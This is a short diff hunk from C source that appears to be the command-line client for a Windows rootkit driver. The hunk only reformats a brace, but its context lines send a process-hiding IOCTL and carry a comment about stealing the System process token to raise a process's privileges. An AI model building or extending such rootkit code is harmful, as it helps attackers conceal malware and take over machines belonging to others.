@@ -62,7 +62,8 @@ int main(int argc, char **argv)
 				memcpy(process, argv[i], strlen(argv[i]));
 				DeviceIoControl(hDevice, IOCTL_HIDE_PROCESS, process, strlen(process), out, sizeof(out), &NombreByte, NULL);
 			}
-			else {
+			else
+            {
 				/* Steal the token of the process "System" for the given process */        
 				if ((i < argc - 1) && !strcmp("-e", argv[i]))
 				{
